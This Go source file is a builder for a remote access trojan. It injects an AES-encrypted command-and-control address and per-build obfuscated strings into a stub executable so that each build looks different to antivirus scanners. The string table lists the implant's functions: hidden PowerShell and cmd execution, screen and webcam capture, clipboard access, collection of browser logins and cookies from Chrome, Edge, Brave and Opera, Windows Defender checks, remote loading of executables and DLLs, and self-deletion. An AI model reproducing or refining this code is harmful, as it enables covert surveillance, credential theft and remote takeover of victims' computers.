package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"os"
)

const (
	ConfigKey = "B4A7E9C2D5F8A1B3C6E9D2F5A8B1C4D7"
	ConfigIV  = "A1B2C3D4E5F6A7B8"
)

var marker = []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC}

type ObfMetadata struct {
	TransformCount int32
	TransformOrder [16]int32
	XorKey1        byte
	XorKey2        byte
	AesKey         [32]byte
	AesIv          [16]byte
}

type Config struct {
	IP      string   `json:"ip"`
	Port    int      `json:"port"`
	Strings []string `json:"s"`
}

func main() {
	ip := flag.String("ip", "127.0.0.1", "Server IP address")
	port := flag.Int("port", 4444, "Server Port")
	flag.Parse()
	args := flag.Args()
	if len(args) >= 1 { *ip = args[0] }
	if len(args) >= 2 { fmt.Sscanf(args[1], "%d", port) }

	fmt.Printf("[+] Building polymorphic client for %s:%d\n", *ip, *port)
	stubPath := "client/client_c.exe"
	if _, err := os.Stat(stubPath); os.IsNotExist(err) { log.Fatalf("[-] stub not found") }
	data, err := ioutil.ReadFile(stubPath)
	if err != nil { log.Fatalf("[-] Error reading stub") }

	indices := findMarkerIndices(data)
	targetIndex := selectTargetIndex(data, indices)
	if targetIndex == -1 { log.Fatalf("[-] Placeholder not found") }

	meta := generateMetadata()

	// MUST MATCH StringIndex enum in utils.h EXACTLY
	rawStrings := []string{
		"ping", "pong", "[msg] ", "Message", "ok", "[exec_ps]", "[ps_output]", "[exec_cmd]", "[cmd_output]",
		"[screen_stop]", "[cam_stop]", "[tasklist]", "[taskkill]", "[ls]", "[download]", "[delete]", "[mkdir]",
		"[upload]", "[rename]", "[rfe_exe]", "[rfe_dll]", "[browser_collect]", "[clipboard_get]", "[clipboard_set]",
		"[uninstall]", "[close]", "[reconnect]", "[set_delay]", "[screen_start]", "[cam_start]", "[sysinfo]",
		"response", "command", "session",
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "CurrentBuild", "DisplayVersion", "ReleaseId",
		"SOFTWARE", "SOFTWARE\\Microsoft\\Windows Defender", "DisableAntiSpyware",
		"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000", "DriverDesc",
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString", "client/1.0", "ipinfo.io",
		"/country", "C:\\", "Unknown", "Windows Defender", "??", "[ls_result]", "[tasklist_result]",
		"pid", "name", "cpu", "mem", "[taskkill_result]", "ok:PID %lu terminated",
		"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"%s\"", "/c %s", "screen.jpg", "[screen_frame]",
		"cam.jpg", "[cam_frame]", "[clipboard_result]", "ERR:OpenClipboard failed", "ERR:GlobalLock failed",
		"[clipboard_set_result]", "ERR:OpenClipboard failed", "ERR:GlobalAlloc failed", "ERR:SetClipboardData failed",
		"[rfe_result]", "error:Download failed", "error:CreateProcess failed", "error:rundll32 failed", "tmp_exe.exe",
		"tmp_dll.dll", "rundll32.exe", "Chrome", "Edge", "Brave", "Opera", "Google\\Chrome\\User Data", "Microsoft\\Edge\\User Data",
		"BraveSoftware\\Brave-Browser\\User Data", "Opera Software\\Opera Stable", "chrome.dll", "msedge.dll", "launcher_lib.dll",
		"Login Data", "Cookies", "Web Data", "Network\\Cookies", "Default", "Profile ", "OSCrypt.AppBoundProvider.Decrypt.ResultCode",
		"cmd /c ping -n 2 127.0.0.1 > nul && del /f /q \"%s\"", "error", "path", "sep", "name", "type", "drive", "size", "mtime",
		"items", "dir", "file", "Directory not found or access denied", "File not found or access denied", "Cannot delete", "mkdir failed",
	}

	obfStrings := make([]string, len(rawStrings))
	for i, s := range rawStrings {
		obfStrings[i] = applyPolymorphicObf(s, meta)
	}

	config := Config{IP: *ip, Port: *port, Strings: obfStrings}
	configBytes, _ := json.Marshal(config)
	encryptedConfig := encryptAES(configBytes, []byte(ConfigKey), []byte(ConfigIV))

	metaBuf := new(bytes.Buffer)
	binary.Write(metaBuf, binary.LittleEndian, meta)

	finalPayload := make([]byte, 8176)
	copy(finalPayload, metaBuf.Bytes())
	copy(finalPayload[metaBuf.Len():], encryptedConfig)

	copy(data[targetIndex+len(marker):], finalPayload)
	ioutil.WriteFile("client.exe", data, 0755)
	fmt.Println("[+] Successfully built polymorphic client.exe")
}

func generateMetadata() ObfMetadata {
	m := ObfMetadata{
		TransformCount: 5,
		XorKey1:        randByte(),
		XorKey2:        randByte(),
	}
	copy(m.AesKey[:], randBytes(32))
	copy(m.AesIv[:], randBytes(16))

	order := []int32{0, 1, 2, 4, 9}
	for i := len(order) - 1; i > 0; i-- {
		j, _ := rand.Int(rand.Reader, big.NewInt(int64(i+1)))
		val := j.Int64()
		order[i], order[val] = order[val], order[i]
	}
	copy(m.TransformOrder[:], order)
	return m
}

func applyPolymorphicObf(s string, m ObfMetadata) string {
	data := []byte(s)
	// Transforms: 0:XOR1, 1:AES, 2:B64, 4:Hex, 9:XOR2
	for _, t := range m.TransformOrder[:m.TransformCount] {
		switch t {
		case 0: for i := range data { data[i] ^= m.XorKey1 }
		case 1: data = encryptAES(data, m.AesKey[:], m.AesIv[:])
		case 2: data = []byte(hex.EncodeToString(data))
		case 4: data = []byte(hex.EncodeToString(data))
		case 9: for i := range data { data[i] ^= m.XorKey2 }
		}
	}
	return hex.EncodeToString(data)
}

func encryptAES(plaintext []byte, key, iv []byte) []byte {
	block, _ := aes.NewCipher(key)
	padding := aes.BlockSize - (len(plaintext) % aes.BlockSize)
	padtext := bytes.Repeat([]byte{0}, padding)
	plaintext = append(plaintext, padtext...)
	ciphertext := make([]byte, len(plaintext))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, plaintext)
	return ciphertext
}

func randByte() byte { b := make([]byte, 1); rand.Read(b); return b[0] }
func randBytes(n int) []byte { b := make([]byte, n); rand.Read(b); return b }

func findMarkerIndices(data []byte) []int {
	var indices []int
	offset := 0
	for {
		idx := bytes.Index(data[offset:], marker)
		if idx == -1 { break }
		indices = append(indices, offset+idx)
		offset += idx + 1
	}
	return indices
}

func selectTargetIndex(data []byte, indices []int) int {
	maxZeros := -1
	target := -1
	for _, idx := range indices {
		if idx+len(marker)+8176 > len(data) { continue }
		zeros := 0
		for i := 0; i < 8176; i++ {
			if data[idx+len(marker)+i] == 0 { zeros++ }
		}
		if zeros > maxZeros { maxZeros = zeros; target = idx }
	}
	return target
}
